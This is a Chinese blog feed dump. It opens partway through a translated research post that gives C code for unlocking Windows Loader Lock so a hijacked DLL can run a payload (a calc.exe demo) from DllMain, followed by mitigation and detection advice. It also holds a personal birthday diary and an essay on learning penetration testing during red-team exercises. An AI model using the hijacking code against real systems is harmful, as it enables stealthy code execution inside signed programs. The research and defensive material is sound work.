class="hljs-keyword">handles</span> <span class="hljs-keyword">of</span> type <span class="hljs-keyword">Event</span><br></code></pre></td></tr></table></figure><p>我们设置这些必要的事件为信号状态(这些标识符似乎永远不会变)…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">SetEvent((HANDLE)<span class="hljs-number">0x40</span>);<br>SetEvent((HANDLE)<span class="hljs-number">0x4</span>);<br></code></pre></td></tr></table></figure><p>在当前线程生成它自己的新线程之前加载<code>ShellExecute</code>需要的库(我们等会解释)…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs C">LoadLibrary(<span class="hljs-string">L&quot;SHCORE&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;msvcrt&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;combase&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;RPCRT4&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;bcryptPrimitives&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;shlwapi&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;windows.storage.dll&quot;</span>); <span class="hljs-comment">// 需要dll后缀因为它的名字中带点</span><br>LoadLibrary(<span class="hljs-string">L&quot;Wldp&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;advapi32&quot;</span>);<br>LoadLibrary(<span class="hljs-string">L&quot;sechost&quot;</span>);<br></code></pre></td></tr></table></figure><p>定位并置零<code>ntdll!LdrpWorkInProgress</code>的状态让<code>ShellExecute</code>生成的新线程可以进行加载工作…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">PBOOL LdrpWorkInProgress = getLdrpWorkInProgressAddress();<br>*LdrpWorkInProgress = FALSE;<br></code></pre></td></tr></table></figure><p>跟<code>ntdll!LdrpLoaderLock</code>类似，我们使用一个NTDLL的导出函数，在此处是<code>RtlExitUserProcess</code>，作为定位<code>ntdll!LdrpWorkInProgress</code>的出发点。</p><p>然后我们来一次<code>ShellExecute</code>…</p><iframe src="/img/full-loader-unlock-demo-shellexecute-calc-directly-from-dllmain.mp4" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" height=600 width=800> </iframe><h4 id="任务完成！"><a href="#任务完成！" class="headerlink" title="任务完成！"></a>任务完成！</h4><p><strong>成功了！</strong>我们的<code>calc.exe</code>弹了出来(所有<code>ShellExecute</code>生成的线程都成功运行了；原来<code>ShellExecute</code>实际上还生成了一个线程)，接着我们在<code>DllMain</code>返回之前做一些善后工作来防止崩溃&#x2F;死锁。我已经在<code>OfflineScannerShell.exe</code>中一步步手动确认过，我们的目标程序完美运行直至自然终结且返回值为0(成功)！</p><p>此处给出我们实现的解锁Loader Lock代码的高度概括：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">define</span> RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN</span><br><br>VOID <span class="hljs-title function_">LdrFullUnlock</span><span class="hljs-params">(VOID)</span> &#123;<br>    <span class="hljs-comment">// 完全破解Loader Lock</span><br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// 初始化</span><br>    <span class="hljs-comment">//</span><br><br>    <span class="hljs-type">const</span> PCRITICAL_SECTION LdrpLoaderLock = getLdrpLoaderLockAddress();<br>    <span class="hljs-type">const</span> HANDLE events[] = &#123;(HANDLE)<span class="hljs-number">0x4</span>, (HANDLE)<span class="hljs-number">0x40</span>&#125;;<br>    <span class="hljs-type">const</span> SIZE_T eventsCount = <span class="hljs-keyword">sizeof</span>(events) / <span class="hljs-keyword">sizeof</span>(events[<span class="hljs-number">0</span>]);<br>    <span class="hljs-type">const</span> PBOOL LdrpWorkInProgress = getLdrpWorkInProgressAddress();<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// 准备部分</span><br>    <span class="hljs-comment">//</span><br><br>    LeaveCriticalSection(LdrpLoaderLock);<br>    <span class="hljs-comment">// 如果要创建新线程，此后的准备步骤是必要的</span><br>    <span class="hljs-comment">// 其他场景下我也发现通常当payload间接调用__delayLoadHelper2时此步骤也是必要的</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN</span><br>    preloadLibrariesForCurrentThread();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    modifyLdrEvents(TRUE, events, eventsCount);<br>    <span class="hljs-comment">// 这样我们就不会在新线程(由ShellExecute生成)加载更多库时在ntdll!LdrpDrainWorkQueue被挂起</span><br>    <span class="hljs-comment">// ntdll!LdrpWorkInProgress必须为真当库被加载进当前线程之后</span><br>    <span class="hljs-comment">// ntdll!LdrpWorkInProgress必须为假当库正被加载进新线程</span><br>    <span class="hljs-comment">// 正因如此，我们必须在当前线程生成新线程之前提前加载ShellExecute需要的库</span><br>    *LdrpWorkInProgress = FALSE;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// 执行我们的payload！</span><br>    <span class="hljs-comment">//</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN</span><br>    <span class="hljs-comment">// 必须预先加载当前线程上通过API调用加载的库</span><br>    payload();<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    DWORD payloadThreadId;<br>    HANDLE payloadThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)payload, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, &amp;payloadThreadId);<br>    <span class="hljs-keyword">if</span> (payloadThread)<br>        WaitForSingleObject(payloadThread, INFINITE);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// 善后</span><br>    <span class="hljs-comment">//</span><br><br>    <span class="hljs-comment">// 必须将 ntdll!LdrpWorkInProgress 设置回真否则有时在从DllMain返回之后会在NTDLL库加载代码中崩溃/死锁</span><br>    <span class="hljs-comment">// 崩溃/死锁是由其他线程中发生的并发操作造成的</span><br>    <span class="hljs-comment">// 默认会由ntdll!TppWorkerThread线程引起(https://devblogs.microsoft.com/oldnewthing/20191115-00/?p=103102)</span><br>    *LdrpWorkInProgress = TRUE;<br>    <span class="hljs-comment">// 将事件设置回到之前安全的状态(尽管在我们的情况下似乎没必要)</span><br>    modifyLdrEvents(FALSE, events, eventsCount);<br>    <span class="hljs-comment">// 重新锁上Loader Lock以确保安全 (尽管在我们的情况下似乎没必要)</span><br>    <span class="hljs-comment">// 不要使用ntdll!LdrLockLoaderLock函数来锁上Loader Lock。因为它有增加ntdll!LdrpLoaderLockAcquisitionCount的副作用而且我们大概率不希望如此</span><br>    EnterCriticalSection(LdrpLoaderLock);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>经过反复测试，代码达到了令人印象深刻的100%成功率，每一次都是成功的。</strong></p><p>想要在当前线程不提前加载所有库的条件下调用<code>ShellExecute</code>(或其他的API)，还需要更多对加载器的逆向工程。要实现这个目标，我推荐在<code>NtSetEvent</code>，<code>NtResetEvent</code>，<code>RtlEnterCriticalSection</code>，<code>RtlLeaveCriticalSection</code>，<code>NtWaitForSinggleObject</code>等函数设置断点。设置读&#x2F;写监视点并且搜索(用我们之前用过的<code>#</code>命令)NTDLL的反汇编中对加载器状态变量的引用，比如<code>ntdll!LdrWorkInProgress</code>可能也会有所帮助。基本上就是在调用<code>ShellExecute</code>之前找到一些可控的NTDLL状态(state)，它们会在<code>ShellExecute</code>唤起的第一个线程中触发<code>ntdll!LdrpWorkInProgress</code>为<code>FALSE</code>。这只是关于什么需要发生的理论，只不过比这更加巧妙(涉及一些被忽略的控制流；也许都没必要接触<code>ntdll!LdrpWorkInProgress</code>)。肯定有方法能够完成。然是需要花些功夫。请随意自己尝试。</p><p>或者，我们也可以通过设置<code>ntdll!LdrpWorlInProgress</code>为<code>FALSE</code>，调用<code>CreateThread</code>(这么做不会加载额外的库)，通过<code>WaitForSingleObject(payloadThread, INFINITE)</code>等待<code>DllMain</code>中的新线程结束，再在新线程中调用<code>ShellExecute</code>(或者其他的payload)来完全解决这个小小的问题 ——不再需要“库预加载”。我比较推荐在实操利用时使用这个解决方案。只不过在此次演示中我希望通过直接从<code>DllMain</code>中执行<code>ShellExecute</code>来完成我的任务！</p><p>为了验证我们的<code>ShellExecute</code>测试法在实操时成不成立，我还试了一些先前在<code>DllMain</code>中(取消定义<code>RUN_PAYLOAD_DIRECTLY_FROM_DLLMAIN</code>)破解Loader Lock失败的复杂操作。包括成功使用WinHTTP下载文件；比起调用<code>WinHttpOpen</code>因<code>WINHTTP_DLL::Startup</code>在加载ws2_32.dll时内部调用__delayLoadHelper2导致的死锁而言已经是显著的进步了。<strong>到目前为止，我们所做的尝试都完美成功了！</strong></p><h4 id="安全！"><a href="#安全！" class="headerlink" title="安全！"></a>安全！</h4><p>安全，安全，人人都想要安全，我们也想在<code>DllMain</code>安全地调用<code>ShellExecute</code>，好，那么我们就来谈谈安全！在我们这项技术中最明显不安全的地方就是与NTDLL直接交互。在Windows中，NTDLL中的一切会随Winodows的版本而变化。微软官方通过稳定的KERNEL32 API来暴露NTDLL的函数，并依此来保持原状。也就是说，我在尝试使用NTDLL中可能是为了减少崩溃几率而保持为无法接触状态的部分。比如，我使用了较为直接且更轻量的NTDLL导出，像为了使这项技术能用我们使用<code>LdrUnlockLoaderLock</code>与<code>RtlExitUserProcess</code>作为定位一些NTDLL内部细节的起点。</p><p>就先假定我们所依赖的实现细节是高度成熟的吧， 尽可能不去改变它们。同时我们已经得到了我们所需的NTDLL内部地址(也许我们可以在进程中查找调试标志)。那么这么做有多安全呢？</p><p>一些Windows技术专家也许会说我们正在做的事违反了锁阶层。因此哪怕我们的进程单独运行时这不成问题，<strong>一些远程进程(remote process)仍然可能合法地在我们的进程中生成线程</strong>并且对loader做一些未指定的并发操作，因而导致死锁&#x2F;崩溃。我已经尽我所能去维护Loader Lock的阶层了，在我们没有权限访问任何内部的微软官方文档的情况下。为了达到遵守锁阶层的目的，我们通过以锁定的相反顺序进行解锁来避免锁顺序倒转的问题。(这同样是为<code>modifyLdrEvents</code>中的事件做的实现)。</p><p>一个较为广为人知的情况是NT内核会在你传递<code>Ctrl+C</code>事件时将线程注入到你的进程中。然而，我觉得那只会在终端程序中发生，而<code>OfflineScannerShell.exe</code>是Windows(GUI)程序。即使这般，只要我们不违反锁阶层，应该就没事。</p><p>我们所做的充其量不过是<a href="https://en.wikipedia.org/wiki/Priority_inversion">优先级反转</a>。虽然从性能角度来看这不是个好办法，因为会导致高优先级任务等待低优先级任务，但依然不会导致死锁&#x2F;崩溃。最糟的情况下，我们违反了锁阶层，可能会导致坏事发生。</p><p>如果你正在编写现实生产应用，那应该不用我说你就得知道：请勿模仿。这篇研究的目的只是证明完全破解Loader Lock在技术上是可能的(而且除此之外，这十分漫长且艰难)。如果你在大量用户使用的产品中部署了这套复杂且迂回的Loader Lock解锁代码，那么责任全在你！还是得说一句，技术上可能是最好的那种可能。;)</p><p><img src="/img/technically-correct-meme.jpg" alt="technically-correct-meme"></p><p>不过说真的，如果你是一个进行产品级软件开发的开发者，请不要使用上面这一套东西。即使你相信这对你而言是足够稳定的而且你不想听从微软官方的指导，尝试用相同的方法在反汇编代码中定位NTDLL内部细节会在非微软官方实现的Windows中失败。</p><p>顺便提一嘴，Wine关于<code>LdrUnlockLoaderLock</code>的<a href="https://en.wikipedia.org/wiki/Windows_Native_API">本地API</a>函数(在Wine源代码<code>dlls/ntdll/loader.c</code>)看起来是这样的：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs C">NTSTATUS WINAPI <span class="hljs-title function_">LdrUnlockLoaderLock</span><span class="hljs-params">( ULONG flags, ULONG_PTR magic )</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (magic)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (magic != GetCurrentThreadId()) <span class="hljs-keyword">return</span> STATUS_INVALID_PARAMETER_2;<br>        RtlLeaveCriticalSection( &amp;loader_section );<br>    &#125;<br>    <span class="hljs-keyword">return</span> STATUS_SUCCESS;<br>&#125;<br></code></pre></td></tr></table></figure><p>完全没有被破坏且没有通过线程ID进行不必要的计算来创建<code>Cookie/magic</code>值。所以，至少在Windows的其他实现版本中，想要安全地释放Loader Lock还不用看反汇编代码还是很容易的。注意<code>flag</code>参数，是用来控制是否改返回错误值或引发一个异常(raised an exception)的，目前在Wine上还没有被实现。对于任何有兴趣帮助Wine的人而言这会是杰出的新手友好型贡献。</p><h2 id="Loader-Lock只在Windows上有问题吗？"><a href="#Loader-Lock只在Windows上有问题吗？" class="headerlink" title="Loader Lock只在Windows上有问题吗？"></a>Loader Lock只在Windows上有问题吗？</h2><p><strong>简单来说，是的。</strong></p><p>在非Windows平台比如Mac与Linux，constructor(in C or C++)是最接近等价于<code>DllMain</code>的存在(虽然Winodws上也有这个，但是经过我的确认在<code>DllMain</code>本体运行前不久它在<code>dllmain_dispatch</code>受Loader Lock限制)。就像<code>DllMain</code>一样，constructor也是在库被加载时运行(对于卸载，还有一个destructor)。在使用GCC编译器的Linux上，任何函数可以被<code>__attribute__((constructor))</code>标记以在加载时运行。</p><p>正如Windows，Linux(使用glibc)当然也有“loader lock”(或者叫互斥锁)来保证线程中的竞态条件的安全性(我读过源代码)。</p><p>所以，为什么你在谷歌上搜索关于Loader Lock的问题你只能搜到Windows这边的问题。为什么只有微软会有那么长的一连串关于你不该在Loader Lock中做什么的清单，而GNU没有。</p><p>调查Windows与Linux(glibc)之间加载器的构造差异便是我下一篇文章的主题(这一篇已经够长了)。</p><blockquote><p><strong>技术抬杠</strong>(<strong>Technicality Nitpick</strong>)</p><p>在Windows中，“互斥锁”指的是进程间的锁而critical section指的是进程内的锁。但是这些属于在本文是通用，可互换使用的。</p></blockquote><h2 id="缓释与检测"><a href="#缓释与检测" class="headerlink" title="缓释与检测"></a>缓释与检测</h2><p><strong>从一开始就阻止相似的DLL被加载将永远是我们防止DLL劫持的最强大的措施。</strong>一旦系统中存在攻击者的代码在运行，我们就之恶能进行反制措施，而此时在学术角度来说已经我们已经输了(即被拖进了猫抓老鼠的游戏中)。</p><p>幸运的是，有一种确定无疑的方法可以检测 对Windows内置的静态加载库的 DLL 劫持。检查受怀疑的 DLL 的导出函数，查找与已签名的微软DLL中名称重复的符号名称(例如，至少是 Windows 附带的)。如果一个未经微软签名的 DLL 导出函数许多与微软签名的DLL具有相同的符号名，那么很有可能它的意图是劫持。这是因为 Windows 库加载程序在执行任何 DllMains 之前，如果发现 DLL 缺少 EXE 所需的导出，就会提前退出:</p><p><img src="/img/offlinescannershell-mpclient-dll-missing-export-error.png" alt="offlinescannershell-mpclient-dll-missing-export-error"></p><p>上述方法可以与其他检测因素相结合，比如磁盘上的DLL是否与复制其导出函数的DLL共享相同的文件名，或者它是否存在于运行程序的全局环境变量<code>PATH</code>或当前工作目录(CWD)中，从而形成一种强大的启发式方法，至少对于内置库劫持是如此。</p><p>最好时刻留意<code>PATH</code>中默认的用户可写目录，比如<code>C:\Users\&lt;你的用户名&gt;\AppData\Local\Microsoft\WindwosApps</code>(上文提到的)。若CWD也是用户可写，也是同理。如果<code>cmd.exe</code>或类似的进程继承了CWD，则尤其如此。<strong>无论是从用户可写的<code>PATH</code>还是CWD中加载的库文件都应该被额外审查。</strong>对于用户可写程序目录，如果程序看起来是从非用户可写目录复制出来的，也是如此。</p><p>对于动态加载的DLL而言检查导入表是没用的(通过<code>LoadLibrary</code>加载)。不过以这种方式加载的DLL不怎么常见。</p><p>为了防止这种情况发生，我们可以检测微软程序是否加载了非微软签名的DLL。这个办法实际上已经存在于Windows中了！以下便是我们如何使用<a href="https://learn.microsoft.com/en-us/powershell/module/processmitigations/set-processmitigation?view=windowsserver2022-ps">Set-ProcessMitigation</a>使我们的目标<code>OfflineScannerShell.exe</code>有效防止DLL劫持：</p><figure class="highlight ps1"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ps1"><span class="hljs-built_in">Set-ProcessMitigation</span> <span class="hljs-literal">-Enable</span> MicrosoftSignedOnly <span class="hljs-literal">-Name</span> OfflineScannerShell.exe<br></code></pre></td></tr></table></figure><p><strong>于是，当我们尝试劫持任何名为<code>OfflineScannerShell.exe</code>的程序，我们都会得到一个错误提示我们我们的非微软签名DLL已经被封禁：</strong></p><p><img src="/img/offlinescannershell-mpclient-dll-unsigned-by-microsoft-error.png" alt="offlinescannershell-mpclient-dll-unsigned-by-microsoft-error"></p><p>因此，只需将该注册表值扔到您的组织中的所有系统中，就像这样，您将很容易挫败任何针对<code>OfflineScannerShell.exe</code>的劫持企图!!</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我们已经成功地创新了之前的研究，发现了一些新的整洁及通用的DLL劫持技术!我们还学习了一些关于并发、Windows库加载器、WinDbg的知识，并阐明了Loader Lock的内部工作原理。如果幸运的话，我们的发现和缓释&#x2F;检测将有助于推动安全行业向前发展!</p><p>单独就Windows来说，有无数的机会让隐匿的代码通过DLL劫持注入到<strong>微软签名</strong>的程序中(用我们的新技术会让它们做的更好)。实际上，安全专家Wietze Beukema (@Wietze)已经在他的项目 <strong><a href="https://hijacklibs.net/">HijackLibs</a>(Sigma检测也包含在内)</strong> 编制了一个包含数百个这样的程序的列表！</p><p>我们新的DLL劫持方法还有助于简化特权提升漏洞攻击程序，即特权应用程序意外加载攻击者控制的DLL。这通常发生在特权应用程序缺少DLL时，可能导致它从用户可写路径加载。</p><p>今天，我们只发现了整洁与通用的DLL劫持技术的冰山一角。还有很多东西等着我们去发现——我有一个笔记，里面有更多其他有前途的内置再NTDLL或CRT的功能，可能会存在更好的技术(一个需要进一步研究的领域)。</p><p>很抱歉两个月没发文章。今后，我将致力于发表更多更短的文章(质量保持不变)，以便定期分享新内容。这篇文章大约有9000字，所以研究然后每篇文章最多写1000字应该能让我完成目标。更多的好东西要来了!</p><p>关于我上文提到的一切内容的<strong>完整开源代码</strong>请见Github仓库 <a href="https://github.com/ElliotKillick/LdrLockLiberator">LdrLockLiberator</a> ！</p>]]></content>
    
    
    
    <tags>
      
      <tag>网安</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二十一岁，但要把这座城市烧成灰</title>
    <link href="/2023/08/15/We_gotta_burn_it_into_ash/"/>
    <url>/2023/08/15/We_gotta_burn_it_into_ash/</url>
    
    <content type="html"><![CDATA[<h1 id="漂流人间第二十一年"><a href="#漂流人间第二十一年" class="headerlink" title="漂流人间第二十一年"></a>漂流人间第二十一年</h1><p><strong>2023.08.15</strong></p><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一晃眼就是21年，不过很难过这一年我自己没有什么大事记，目前也没有写小作文哀悼我的光阴的灵感，这篇就以日记的形式写吧。</p><h2 id="生日？批日！"><a href="#生日？批日！" class="headerlink" title="生日？批日！"></a>生日？批日！</h2><p>老实说我不怎么过生日，自从小学被老妈pua说我的生日是她的受难日，而且得花钱之类的我就没怎么像之前那样请同学来家里开party吃蛋糕了。不过一般生日老爸老妈会拉我回老家吃顿老广典中典宴席。</p><p>如果我自己过生日的话不然就是叫几个朋友出来聚一聚吃一餐，不过不是以我生日的名义，或者自己一个人随便逛逛。到了这个年纪之后生日这一天只起到一个年龄标定的作用，不然我可能会忘记这是漂流人间的第几年。</p><p>遥想去年因为疫情 <em>(错误记忆来了)</em> 呆在家里那段一言难尽的时光，我时常因为痛苦在床上翻来覆去无法入眠，脑海里全都是那一句“我的痛苦已经大于我的力量了”，而且也是只有一个人在小县城，朋友都上学去了，连想找个人出来一起聚一聚聊一聊都不行，还跟家里典中典闹矛盾，典中典pua，搞得我一度觉得我是不是已经22岁了，因为22岁了整天啥也不干待在家里啃老当neet确实是有点哈哈了。我还得根据我出生的年份倒推一下才得知我20，虽然20了呆在家啃老也差不多，不过要是能去学校我早去了，留在家里受罪干什么。</p><h2 id="如今的生日"><a href="#如今的生日" class="headerlink" title="如今的生日"></a>如今的生日</h2><p>故今年正好因为有比赛要打就索性呆在学校不回去了，也就到了今天这个无比正常的日子。也是前几天才想起来今天是我生日，本来还想着我可能会抛开一切出去好好玩一玩，但我向来是“明天的事，交给明天的我”，只有当天的自己有决定当天事务的权利（这下人不可能踏进同一条河流了），非当天的自己不能决定与议论当天自己的决定。</p><p>于是乎今天的我感觉没有心思在一个陌生的城市里游荡，况且也没什么特别想见的朋友，一个人去游乐场所玩的话又感觉怪寂寞的，所以今天还是呆在宿舍里推galgame谢谢小作文算了。</p><h2 id="日记"><a href="#日记" class="headerlink" title="日记"></a>日记</h2><p>近日时差还是难以调整，为了能够晚上睡觉我特地撑了一整天没睡着，还买了两罐啤酒回来助眠，不过昨天晚上还是一点半左右睡的，本来没定闹钟就是为了能睡到自然醒，不过我没想到早上六点我就醒了，估计是因为没把宿舍窗帘拉上给我亮醒了。接着就再也睡不着，看看群里消息也没啥活可干。于是起来破天荒地晨跑去了。</p><p>一年，甚至两年没有运动，加上每天都在抽烟，400米的操场慢跑一圈都喘死我了。其实也不是今天突然想去跑步，昨天其实久违地跑酷去了，不过也就是在学校里找了几个地形把动作都给做了一遍。本来是想再体验一下全身酸痛的满足感，结果没想到了，热身结束之后腿都已经没劲儿了，跑步都迈不开步子，不过跑酷的大多数动作还是能做的。今早醒来的时候只有手臂和大腿有一点酸疼，看来是训练力度远远不够了。</p><p>今天早上走在去操场的路上我忽然发现手背的食指根部的一小条肉疙瘩，回忆起来应该是初中刚开始练习跑酷的时候受的伤了，平常一直没在意还以为早好了没留痕迹呢，想来我身上还是有些东西没变的。</p><p>至于突然开始跑步的举动从何而来，估计是最近受了galgame男主的影响了，里边说运动有助于放松，这样大脑就不会想七想八，其实我早就想通过运动让自己能够不要总是想七想八了。只不过一直有各种借口没去，而现在假期学校没那么多人，操场也是塑胶的，早上操场基本没有人，跑起来也不会让膝盖太难顶。这些天不去跑步估计到时候开学了那些借口又会统统冒出来。</p><p>回想起初中的时候我也每天早上都起来晨跑，当时对跑酷十分热忱，每天除了自发的晨跑和体能训练，还会上网看动作教学，哪怕只有一个人，哪怕刚开始跑得很依托会遇到路人怪异的目光，但是当时我始终相信坚持训练下去肯定会变强。高中的时候碰巧遇到了班上另外一个跟我水平差不多的跑酷者，高一的时候基本是训练最多的时候，甚至十分钟下课都要去跑一会。后来遇到各种各样的事，基本上就是典中典的对抗学校权威之类的事把我对跑酷的热情消磨得差不多了，但是又没法就这么埋头到学习上，最后直到高考结束我也没有再想以前那样坚持训练了。</p><p>想来就是被击垮后一蹶不振了，只剩下整天窝在家里抽烟无所事事，荒废了太多时光，心里还老堵着这些东西，想在生活上迈出步子都变得尤为困难。</p><p>现在渴望改变主要是觉得被焦虑折磨得啥也做不了不是办法，总得趁着大三这一年使劲嗯造，不然就真要寄了。</p><h2 id="许个愿吧"><a href="#许个愿吧" class="headerlink" title="许个愿吧"></a>许个愿吧</h2><p>不知道未来还多多少个这样自己一个人过的生日，不过大多情感的缺失我基本都还能在galgame中获取，所以目前来说忍受孤独还不是什么难事，只要注意虚拟与现实之间的界限就好了，不然就可能像去年一样搞得自己快魔怔了。</p><p>所以我就许个愿望希望在做渗透这块能够拿出当时初学跑酷一样的热忱吧。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>网安扫盲第一集</title>
    <link href="/2023/08/13/cybersecurity_one/"/>
    <url>/2023/08/13/cybersecurity_one/</url>
    
    <content type="html"><![CDATA[<h3 id="2023-08-13"><a href="#2023-08-13" class="headerlink" title="2023.08.13"></a>2023.08.13</h3><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>虽然说之前混的实验室之类的比赛基本上都打完了，但解放的感觉并未如约而至，并没有那种终于不用干开发，终于润到网安发展的感觉。所以说转变不是光靠等能等出来的，还是得自己去争取啊。</p><p>因为一次偶然的教育hvv的机会终于有机会能和学校里大名鼎鼎的网安大手子L神合作，我一直想着能抓住机会学学手法，到时自己应该也就自然而然能悟了。毕竟我也是从小时候开始也多多少少接触过一些。学起来应该会比没有底子来得快，而且L神就在现场操作讲解，要是这都学不会难道要让人手把手在键盘上一个字母一个字母地教吗？</p><p>我本来是这么想的。直到实实在在看到L神和金神的操作，我才想起来经典电影《Who am I:No System is Safe》里的台词：“黑客所为，就如同变魔术”。倒不是说像电影里说的是靠的障眼法，而是就如同字面意思:完全看不懂，就像再看魔术。这里抓包更改传入的参数，那里填充脏数据绕过waf上传。这么一来二去，就把别人站点拿下来了，然后打到内网里再让金神来变魔术。我最多就回忆回忆小时候玩的msf操作，帮他们打打ms17010然后得了个“蓝神“的称号，什么“永恒之蓝的神”，想想我都要笑，呜呜呜太fw了。不过在那次hvv中把msf玩爽了。</p><p>要说收获嘛，顶多是把内网渗透的流程熟悉了一遍，要用的工具，还有一些手法。起码玩起来比打点容易，说白了就是脚本小子式的操着工具嗯造就完了。getshell了之后直接上fscan开扫，横向全靠ms17010，没有就差不多寄。更多就是跟隔壁学校一起hvv的师傅学了一手反向代理隧道，还有mimikatz抓密码之类的细小操作，说白了我对自己内网方面不满的就是，也许让我上确实能操作起来，但是也就这样了，对于知识没有系统的总结构建，搭建不起来一个完整的知识体系。这些操作金神和L神自己上也不是不行，只是没必要，他们的精力应该放在继续打点和免杀过马之类的复杂工作上，也就是说，我的工作是可以被替代的，还不具备与他们并肩的实力。</p><p>但是L神在之后接的hvv代打每次进了内网还能拉我一把，还说一起分钱，我简直是想给他哐哐磕头了，真不夸张的说，L神简直是我的电子义父，要是我以后真能玩得更好，能出本书估计半篇篇幅都得写L神，我就是这么敬佩他。</p><p>也因为这个情况，没有L神我就一无是处，打点还没有成功过，唯一成功的那次是教育hvv时内网基本都被蓝队应急了，准备收收心钓鱼的时候我看到nuclei扫到的symfony啥啥RCE漏洞啥的，点进去一看是个symfony的调试模式能看日志的东西。搜poc找到是个nday，现场试着复现却发现没那么一致，没法直接利用，L神也觉得这个没戏。就在要放弃的时候灵光一现想到都可以查日志了直接查登录记录看看管理员密码不久好了。后来找到个用户密码，登录之后再用找到的管理员登录cookie替换一下就进去了。还真是，把站日下来的那一个瞬间，那种快感比🐍了都爽。虽然还是在框架允许的范畴下拿到的管理员，没有getshell，不过想来这也是小时候幻想着成为嗨客以来第一次成功的日下来一个站，简直是要起飞。后来发现日下来的是主站，可以往分站添加管理员，靠着这一手把几个分站用nday给shell了，只能说是唯一的高光时刻了。扯远了，其实想表达的就是自己打点这块太薄弱，等L神和我都毕了业，如果我也想吃这碗饭，靠这个水平是别想了，到时人家也不会带着我这个拖油瓶，若是不趁这个机会好好学学，基本上是毕业即失业了。所以我也想好好学一遍，起码有点打点成功的经历，我也能对自己多点信心，而且这样以来再有hvv或者其他的业务的时候，能多帮上L神一点忙，不像现在被蓝队应急了就只能闲着没事干等L神再shell几个站才有活干，平常自己也能靠着挖挖SRC赚点(现在是，幻想时间)。</p><p>大概背景就是这样，然后在观摩了多次L神打点的过程之后，最深的感触就是经验的差距，L神已经成长成了一个打点终极高手，放在全国都能打的那种，他也说过在日站的过程中无非就是测功能点，然后看有无越权，有无XSS之类的利用点，还有更直接的弱口令之类。但是我不知道哪些参数会造成越权，哪些地方能找到XSS或者sql的注入点，不说正经的哇漏洞，光是hvv这种随心所欲嗯造的场所，我也不知道这个站点是struct2或者weblogic或者tomcat，有没有能直接用工具利用的漏洞，或者是什么致远oa，万户oa，有什么day，我压根不知道，我甚至不知道oa是啥（这就是这篇文章的主题），这也就造成了一个大问题，不说在正经干活的时候不会，甚至在学的时候也不知道该从哪里开始。我是要从特定几个漏洞复现开